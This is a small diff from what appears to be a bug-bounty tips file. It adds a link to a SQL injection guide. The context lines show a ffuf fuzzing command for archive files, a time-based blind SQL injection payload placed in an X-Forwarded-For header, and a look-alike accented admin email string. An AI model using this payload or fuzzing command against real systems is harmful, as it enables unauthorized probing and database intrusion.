@@ -24,7 +24,7 @@ ffuf -w /iis.txt -u x.a[.]com/x.aFUZZ -e zip,7z,gz
 payload Tips :
 X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(8),0))XOR'
 
-
+https://nav1n0x.gitbook.io/advanced-sql-injection-techniques
 
 
 ádmin@hackerone
